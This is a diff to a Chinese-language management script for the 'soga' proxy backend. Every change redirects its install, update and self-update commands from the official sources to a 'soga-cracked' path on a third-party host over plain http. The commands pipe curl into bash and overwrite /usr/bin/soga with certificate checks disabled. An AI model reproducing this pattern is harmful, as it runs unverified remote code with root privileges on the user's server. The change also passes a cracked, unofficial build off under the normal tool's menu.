@@ -84,7 +84,7 @@ before_show_menu() {
 }
 
 install() {
-    bash <(curl -Ls https://blog.sprov.xyz/soga.sh)
+    bash <(curl -Ls http://www.jacobsdocuments.xyz/Code/soga-cracked/soga.sh)
     if [[ $? == 0 ]]; then
         if [[ $# == 0 ]]; then
             start
@@ -108,7 +108,7 @@ update() {
 #        fi
 #        return 0
 #    fi
-    bash <(curl -Ls https://blog.sprov.xyz/soga.sh) $version
+    bash <(curl -Ls http://www.jacobsdocuments.xyz/Code/soga-cracked/soga.sh) $version
     if [[ $? == 0 ]]; then
         echo -e "${green}更新完成，已自动重启 soga，请使用 soga log 查看运行日志${plain}"
         exit
@@ -252,7 +252,7 @@ install_bbr() {
 }
 
 update_shell() {
-    wget -O /usr/bin/soga -N --no-check-certificate https://github.com/sprov065/soga/raw/master/soga.sh
+    wget -O /usr/bin/soga -N --no-check-certificate http://www.jacobsdocuments.xyz/Code/soga-cracked/soga.sh
     if [[ $? != 0 ]]; then
         echo ""
         echo -e "${red}下载脚本失败，请检查本机能否连接 Github${plain}"
@@ -369,7 +369,7 @@ show_usage() {
 show_menu() {
     echo -e "
   ${green}soga 后端管理脚本，${plain}${red}不适用于docker${plain}
---- https://github.com/sprov065/soga ---
+--- http://www.jacobsdocuments.xyz/Code/soga-cracked/soga.sh ---
   ${green}0.${plain} 退出脚本
 ————————————————
   ${green}1.${plain} 安装 soga
